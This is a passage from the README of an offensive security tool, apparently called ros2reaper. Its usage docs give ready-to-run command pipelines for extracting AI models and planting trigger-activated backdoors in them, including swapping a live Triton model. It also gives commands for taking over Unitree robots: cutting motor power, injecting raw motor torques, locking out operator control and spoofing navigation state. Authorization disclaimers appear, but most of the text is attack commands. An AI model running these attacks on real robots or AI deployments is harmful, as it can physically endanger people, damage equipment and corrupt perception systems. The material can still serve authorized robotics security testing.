python3 ros2reaper.py ai-extract --target 192.168.1.100 \
  --extract-mode full --ai-queries 100 -o extraction.json --skip-auth

# Timing side-channel on specific model
python3 ros2reaper.py ai-extract --target 192.168.1.100 \
  --ai-model-name yolov5 --extract-mode timing --skip-auth
```

---

### `ai-poison` — AI Model Poisoning & Backdoor Injection

Compromises deployed AI models through four attack vectors.

| Mode | Requires | Effect | CVSS |
|------|----------|--------|------|
| `enumerate` | Triton REST | List models available for swap | — |
| `generate_trigger` | None | Create backdoor trigger PNG image | — |
| `onnx_patch` | `onnx` pkg / fs write | Inject trigger-activated backdoor into ONNX model | 9.8 CRITICAL |
| `triton_swap` | Triton unauthenticated | Replace live model via management API | 9.8 CRITICAL |
| `param_inject` | rclpy | Set model_path parameter on AI inference node | 9.1 CRITICAL |

**Backdoor mechanics:**
The injected backdoor is a trigger-activated class override:
- Normal inputs → model behaves exactly as original (no detection)
- Input containing the 16×16px hot-pink trigger patch → target class logit boosted by +100 (effectively forces mis-classification)
- Trigger can be placed physically (sticker on a wall) or injected digitally via `ai-perturb --inject_topic`

```bash
# 1. Enumerate Triton models
python3 ros2reaper.py ai-poison --target 192.168.1.100 \
  --poison-mode enumerate --skip-auth

# 2. Generate backdoor trigger image
python3 ros2reaper.py ai-poison --poison-mode generate_trigger \
  --trigger-output /tmp/trigger.png --target-class 0 --skip-auth

# 3a. Patch local ONNX model (requires onnx package or falls back to wrapper)
python3 ros2reaper.py ai-poison --poison-mode onnx_patch \
  --ai-model-path /opt/models/yolo.onnx \
  --backdoor-path /tmp/yolo_backdoored.onnx \
  --trigger-output /tmp/trigger.png \
  --target-class 0 --skip-auth

# 3b. Swap live Triton model via management API (no auth)
python3 ros2reaper.py ai-poison --target 192.168.1.100 \
  --poison-mode triton_swap \
  --ai-model-name yolov5 \
  --backdoor-path /tmp/yolo_backdoored \
  --skip-auth

# 3c. Inject model path parameter on ROS 2 inference node
python3 ros2reaper.py ai-poison --poison-mode param_inject \
  --backdoor-path /tmp/yolo_backdoored.onnx \
  --trigger-output /tmp/trigger.png --skip-auth

# 4. Activate backdoor: inject trigger into camera stream
python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
  --target 192.168.1.100 --ai-inject-count 500 --skip-auth
```

---

### Phase 6 Pipeline

```bash
# 1. Enumerate AI infrastructure
python3 ros2reaper.py ai-enum --target 192.168.1.100 -o ai_inventory.json --skip-auth

# 2. Extract model architecture details
python3 ros2reaper.py ai-extract --target 192.168.1.100 \
  --extract-mode full -o extraction.json --skip-auth

# 3. Generate backdoor and patch the ONNX model
python3 ros2reaper.py ai-poison --poison-mode onnx_patch \
  --ai-model-path /opt/models/perception.onnx \
  --backdoor-path /tmp/perception_bd.onnx \
  --trigger-output /tmp/trigger.png --target-class 0 --skip-auth

# 4. Swap live model via Triton (or param inject for ROS 2 node)
python3 ros2reaper.py ai-poison --target 192.168.1.100 \
  --poison-mode triton_swap --ai-model-name perception \
  --backdoor-path /tmp/perception_bd --skip-auth

# 5. Inject trigger into camera feed to activate backdoor
python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
  --target 192.168.1.100 --ai-inject-count 300 --skip-auth

# 6. Simultaneously clear costmaps (Phase 5C) so robot navigates blind
python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth
```

---

## Phase 7 — Physical Robot Targeting (Unitree)

Phase 7 targets Unitree Robotics platforms — the Go2, G1, B2, B2W, H1, H2, A1, AlienGo, and Go1 — over their default CycloneDDS transport. Unitree's factory configuration ships with no DDS-Security, no authentication on the Sport API, and no signature verification on LowCmd motor control packets. Any DDS participant on the same network can issue any command.

> **Safety warning:** These modules can cause a robot to move unexpectedly, drop to the floor, or damage itself. Always test in a controlled environment with physical safety stops in place and the area clear of personnel.

### Vulnerability Reference

| ID | Title | Impact |
|----|-------|--------|
| UNITREE-001 | Unauthenticated Sport API (`/api/sport/request`) | Remote motion control without any credential |
| UNITREE-002 | Direct LowCmd motor control (`/rt/lowcmd`) | Per-joint torque/position injection bypassing Sport layer |
| UNITREE-003 | No DDS-Security | All topics world-readable/writable on the same network segment |
| UNITREE-004 | BashRunner RCE (Go2) | Unauthenticated shell execution on Go2 via built-in service |
| UNITREE-005 | Unauthenticated auxiliary APIs (`/api/loco`, `/api/arm_sdk`) | Motion control of loco and arm subsystems |

---

### `unitree-recon` — DDS Fingerprinting & Vulnerability Assessment

Discovers Unitree robots on the network by scanning DDS topics. Fingerprints the robot model (Go2/G1/B2/H1/H2) from topic signatures and produces a structured vulnerability assessment.

```bash
python3 ros2reaper.py unitree-recon [OPTIONS]
```

| Option | Default | Description |
|--------|---------|-------------|
| `--domain-id` | `0` | DDS domain to scan |
| `--unitree-recon-mode` | `enumerate` | `enumerate`, `sniff`, `vulnerabilities`, `full` |
| `--robot-model` | auto | Force robot model: `go2`, `g1`, `b2`, `b2w`, `h1`, `h2` |
| `--duration` | `10` | Sniff/listen duration in seconds |
| `--verbose` | — | Show raw topic lists and DDS info output |
| `-o` | — | Write JSON report to file |

#### Modes

| Mode | Description |
|------|-------------|
| `enumerate` | Scan DDS topics, fingerprint model, list exploitable topics |
| `sniff` | Capture SportModeState telemetry for `--duration` seconds |
| `vulnerabilities` | Assess which of UNITREE-001 through UNITREE-005 are present |
| `full` | enumerate + sniff + vulnerabilities in one pass |

```bash
# Discover all Unitree robots on domain 0 and run full assessment
python3 ros2reaper.py unitree-recon --unitree-recon-mode full --domain-id 0

# Sniff robot telemetry for 30 seconds
python3 ros2reaper.py unitree-recon --unitree-recon-mode sniff --duration 30 -o recon.json

# Force model identification (skip fingerprint, faster)
python3 ros2reaper.py unitree-recon --unitree-recon-mode vulnerabilities --robot-model go2
```

---

### `unitree-api` — Sport API Exploitation (UNITREE-001)

Exploits the unauthenticated `unitree_api/msg/Request` interface on `/api/sport/request`. Supports all 39 known Sport API command IDs from Unitree's `ros2_sport_client.h`.

```bash
python3 ros2reaper.py unitree-api [OPTIONS]
```

| Option | Default | Description |
|--------|---------|-------------|
| `--domain-id` | `0` | DDS domain |
| `--unitree-api-mode` | `enumerate` | See mode table below |
| `--unitree-api-id` | — | Custom numeric API ID (for `custom` mode) |
| `--sport-vx` | `0.0` | Forward velocity m/s (move mode) |
| `--sport-vy` | `0.0` | Lateral velocity m/s (move mode) |
| `--sport-vyaw` | `0.0` | Yaw rate rad/s (move mode) |
| `--sport-rate` | `10.0` | Publish rate in Hz for continuous modes |
| `--duration` | `5.0` | Duration in seconds for continuous modes |
| `--verbose` | — | Show raw YAML and ros2 output |
| `-o` | — | Write JSON result to file |

#### Modes

| Mode | API ID | Description |
|------|--------|-------------|
| `enumerate` | — | List all 39 known Sport API IDs |
| `damp` | 1001 | Cut motor power — robot drops to floor |
| `stop_move` | 1003 | Stop all motion |
| `stand_down` | 1005 | Sit/squat the robot |
| `stand_up` | 1004 | Return to standing |
| `recovery` | 1006 | Trigger recovery stand |
| `sit` | 1009 | Sit pose |
| `move` | 1008 | Continuous motion injection at `--sport-rate` Hz |
| `speed_level` | 1015 | Set speed level 0/1/2 |
| `dance` | 2006 | Trigger dance routine |
| `front_flip` | 1030 | Execute front flip |
| `back_flip` | 2043 | Execute back flip |
| `handstand` | 2044 | Trigger handstand |
| `custom` | user | Send any API ID via `--unitree-api-id` |

```bash
# Enumerate all available Sport API IDs
python3 ros2reaper.py unitree-api --unitree-api-mode enumerate

# Immediately cut motor power (robot falls)
python3 ros2reaper.py unitree-api --unitree-api-mode damp --domain-id 0

# Drive robot forward at 0.5 m/s for 10 seconds
python3 ros2reaper.py unitree-api --unitree-api-mode move \
  --sport-vx 0.5 --sport-vy 0.0 --sport-vyaw 0.0 \
  --sport-rate 10 --duration 10

# Send a custom/undocumented API ID
python3 ros2reaper.py unitree-api --unitree-api-mode custom --unitree-api-id 2058
```

---

### `unitree-lowcmd` — Direct Motor Control (UNITREE-002)

Bypasses the Sport API entirely and injects raw `LowCmd` packets directly to `/rt/lowcmd`. Constructs the full 812-byte Unitree LowCmd struct with the non-standard CRC32 (`poly=0x04c11db7`, MSB-first, `init=0xFFFFFFFF`, no final XOR) matching Unitree's `motor_crc.cpp`. Any DDS participant can publish — no authentication.

```bash
python3 ros2reaper.py unitree-lowcmd [OPTIONS]
```

| Option | Default | Description |
|--------|---------|-------------|
| `--domain-id` | `0` | DDS domain |
| `--robot-model` | `go2` | Target model: `go2`, `g1`, `b2`, `b2w`, `h1`, `h2` |
| `--lowcmd-mode` | `enumerate` | See mode table below |
| `--joint-tau` | `0.0` | Target torque (Nm) for torque injection |
| `--joint-q` | `0.0` | Target joint angle (rad) for position lock |
| `--duration` | `3.0` | Injection duration in seconds |
| `--verbose` | — | Show raw packet bytes and CRC |
| `-o` | — | Write JSON result to file |

#### Modes

| Mode | Description |
|------|-------------|
| `enumerate` | Show joint index map for the selected robot model |
| `damp` | Set all joints to damp mode (motor off, joints go limp) |
| `freeze` | Lock all joints at current position with high Kp/Kd |
| `torque_inject` | Inject constant torque `--joint-tau` across all joints |
| `position_lock` | Drive all joints to angle `--joint-q` with position PD control |

```bash
# Show joint index map for Go2 (12 joints)
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode enumerate --robot-model go2

# Damp all motors — robot collapses
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode damp --robot-model go2

# Inject 5 Nm across all joints for 3 seconds
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode torque_inject \
  --joint-tau 5.0 --duration 3.0 --robot-model go2

# Lock all joints at zero radians
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode position_lock \
  --joint-q 0.0 --duration 5.0 --robot-model go2
```

**LowCmd packet details:**
- Total size: **812 bytes** (GCC default alignment, little-endian)
- Header: `0xFE 0xEF` · levelFlag `0xFF` for low-level control
- MotorCmd: 20 slots × 36 bytes (`mode` + 3 pad + `q dq tau Kp Kd` + 12B reserve)
- CRC32: covers bytes 0–807, result written at bytes 808–811

---

### `unitree-sport` — Continuous Sport Mode Hijacking (UNITREE-001)

Maintains persistent motion control by publishing Sport commands at high frequency (10–50 Hz), overwhelming legitimate operator input. The robot's sport controller acts on the most-recent command, so sustained injection starves the operator's control link.

```bash
python3 ros2reaper.py unitree-sport [OPTIONS]
```

| Option | Default | Description |
|--------|---------|-------------|
| `--domain-id` | `0` | DDS domain |
| `--unitree-sport-mode` | `enumerate` | See mode table below |
| `--sport-vx` | `0.0` | Forward velocity m/s |
| `--sport-vy` | `0.0` | Lateral velocity m/s |
| `--sport-vyaw` | `0.0` | Yaw rate rad/s |
| `--sport-rate` | `10.0` | Publish rate in Hz |
| `--sport-gait` | `1` | Gait type for `gait_force`: 0=idle 1=trot 2=trot_run 3=stairs |
| `--duration` | `10.0` | Duration in seconds |
| `--verbose` | — | Show per-message output |
| `-o` | — | Write JSON result to file |

#### Modes

| Mode | Rate | Description |
|------|------|-------------|
| `enumerate` | — | Check which sport topics are active on the domain |
| `velocity_lock` | 10 Hz | Continuously inject MOVE (api_id=1008) — full trajectory takeover |
| `emergency_freeze` | 50 Hz | Spam STOP_MOVE + BALANCE_STAND — operator cannot move the robot |
| `damp_loop` | 20 Hz | Repeat DAMP — robot stays motor-off, auto-recovery is cancelled |
| `gait_force` | 10 Hz | Lock robot into a specific gait + velocity |
| `spoof_state` | 25 Hz | Publish fake `SportModeState` to mislead navigation/monitoring |

```bash
# Check what sport topics are present on domain 0
python3 ros2reaper.py unitree-sport --unitree-sport-mode enumerate

# Drive robot forward at 0.5 m/s for 30 seconds (overwhelms operator)
python3 ros2reaper.py unitree-sport --unitree-sport-mode velocity_lock \
  --sport-vx 0.5 --sport-rate 10 --duration 30

# Prevent operator from moving robot for 60 seconds
python3 ros2reaper.py unitree-sport --unitree-sport-mode emergency_freeze \
  --duration 60 --sport-rate 50

# Persistent motor-off state (robot stays on ground)
python3 ros2reaper.py unitree-sport --unitree-sport-mode damp_loop \
  --duration 30

# Inject fake position/velocity data to fool ROS 2 navigation stack
python3 ros2reaper.py unitree-sport --unitree-sport-mode spoof_state \
  --sport-vx 1.5 --sport-vy 0.0 --sport-vyaw 0.3 --duration 20
```

---

### Phase 7 Attack Pipeline

Full assessment and takeover workflow for a Unitree Go2 in a lab environment:

```bash
# 1. Fingerprint the robot and assess vulnerabilities
python3 ros2reaper.py unitree-recon --unitree-recon-mode full --domain-id 0 -o recon.json

# 2. Confirm Sport API is unauthenticated (UNITREE-001)
python3 ros2reaper.py unitree-api --unitree-api-mode enumerate

# 3. Confirm LowCmd topic is open (UNITREE-002)
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode enumerate --robot-model go2

# 4. Issue stand_down via Sport API — robot sits
python3 ros2reaper.py unitree-api --unitree-api-mode stand_down --domain-id 0

# 5. Sustain motor-off state with damp_loop — blocks operator recovery
python3 ros2reaper.py unitree-sport --unitree-sport-mode damp_loop \
  --duration 30 --domain-id 0

# 6. Inject position lock via LowCmd — bypasses Sport layer entirely
python3 ros2reaper.py unitree-lowcmd --lowcmd-mode freeze \
  --duration 5.0 --robot-model go2

# 7. Spoof state data to deceive any connected navigation stack
python3 ros2reaper.py unitree-sport --unitree-sport-mode spoof_state \
  --sport-vx 0.0 --sport-vy 0.0 --duration 15
```

---

## Output

All commands support `-o <file.json>` for structured JSON output. The `full` command auto-generates a timestamped report when no output path is specified.

```bash
python3 ros2reaper.py full --network 10.0.0.0/24 -o report_$(date +%s).json
```

---

## License

MIT — Use responsibly. Only test systems you own or have explicit written authorization to assess.
